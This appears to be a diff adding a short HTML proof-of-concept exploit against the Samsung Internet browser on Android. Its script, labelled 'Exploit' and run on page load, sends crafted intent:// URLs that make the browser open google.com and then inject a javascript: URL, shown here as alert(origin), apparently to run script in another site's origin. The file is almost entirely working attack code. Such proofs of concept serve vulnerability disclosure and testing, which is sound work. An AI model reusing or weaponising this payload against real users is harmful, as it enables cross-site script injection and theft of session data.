@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+  <body>
+    <button id="openTwo" style="font-size:2em; padding:1em 2em;">Exploit</button>
+    <script>
+    const link1 = "intent://com.sec.android.app.sbrowser/SBrowserMainActivity#Intent;component=com.sec.android.app.sbrowser/com.sec.android.app.sbrowser.SBrowserMainActivity;action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE;S.extra_access_url=https%3A%2f%2fwww.google.com;B.extra_by_capsule=true;B.language_code=true;end";
+    const link2 = "intent://com.sec.android.app.sbrowser/SBrowserMainActivity#Intent;component=com.sec.android.app.sbrowser/com.sec.android.app.sbrowser.SBrowserMainActivity;action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE;S.extra_access_url=javascript%3Aalert(origin);B.extra_by_capsule=true;B.language_code=true;end";
+    setTimeout(() => {
+        window.location.href = link1;
+        for (let i = 0; i < 5; i++) {
+        setTimeout(() => {
+            window.location.href = link2;
+        }, 800 * (i + 1));
+    }
+    }, 500);
+    </script>
+  </body>
+</html>
